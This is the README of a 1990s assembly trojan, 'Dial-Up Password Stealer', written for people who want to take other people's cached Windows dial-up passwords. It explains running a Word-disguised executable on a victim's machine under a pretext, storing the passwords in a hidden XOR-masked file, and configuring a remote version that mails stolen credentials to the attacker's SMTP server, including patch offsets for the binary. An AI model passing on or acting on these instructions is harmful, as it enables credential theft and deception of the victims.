Dial-Up Password Stealer v1.0 by Stas
=====================================

Coded by Stas (Mail: stas@grad.icmc.sc.usp.br; URL: http://sysd.hypermart.net);
(C)opyLeft by SysD Destructive Labs, 1997-2000


Intro:
======

Here is an assembly-coded (TASM50) trojan that will steal Dial-Up passwords
from Windows' password cache (if some dickhead dropped them there, sure).
The package consists in Local and Remote version. To compile both, type
"make". To compile only Local version, type "make local". I'll not say how
to compile only Remote version, this will be your homework >:)
So, what the fuckin' difference between those versions? Well...


Usage:
======

a). If you can access personally computer whitch password you wanna steal,
use local.exe. Put it on a floppy. It looks like Word document, ya? So...
Insert that floppy in victim computer, saying like:
"Oh, damn, I **MUST** read this document **NOW**!!!".
Double-click it, and Windows says that disk is damaged. That's right, but the
only damage is hidden/system file A:\OUT.$$$ containing all stolen passwords.
If open that in Notepad, you'll se only binary waste. Now, try to XOR all bytes
using mask 0xFF ;)

b). If you wanna steal password of some connected asshole, use remote.exe.
It will send you stolen passwords through email. Sure, before sending trojan
to victim, configure it, otherwise you're expanding my growing list of stolen
passwords. "How to do that?" -- Take a snoop in remote.asm. It has likes like:

    HOST		EQU	143,107,231,17		; IP addr bytes
    PORT		EQU	25 * 100h		; htons(IPPORT_SMTP)

This specifies your SMTP server. Note that oyu can't put domain names here,
cos' I didn't made support for this, as I think it's quite useless.
Now, seek for "Rcpt" in remote.asm. It looks like:

    Rcpt		DB	"stas", 64 - ($ - Rcpt) DUP (0)

Just put your recipient address here.
"And what can I do if I have no TASM50?" -- Use any hex editor. That will be
a pain in your ass, so it's better to get Turbo Assembly 5.0...
Anyway: HOST stays at offset 0x628 (4 bytes); PORT at 0x626 (2 bytes, and
remember: it's htons()'ed!!!); and a recipient address at 0x634 (note that
I left you 64 bytes to do that, and remember that you **MUST** have a NULL
at end!).

NOTE: If user executes remote.exe while not-connected, the trojans hides itself
and attempts to send mail every minute for one day.


That's all 'bout it... Have a fun!!! Remember that I'm not responsable for
any harm that my proggies or even you did. Note also that I'll **NOT** answer
questions like: "What does mean 0x634?" and "Why didn't you included Turbo
Assembler 5.0 in your package?". If you read this file and not understood it,
just go to www.altavista.com and seek for a better trojan.


References:
===========

* Password dump code from PWLView by Wagner Patriota G. Soares.
* Proccess hider by CybOrgAsm.
* Some TCP/IP stuff from IIS 4.0 remote overflow exploit by dark spyrit
* Other TCP/IP stuff from Talk by Jimmy Moore
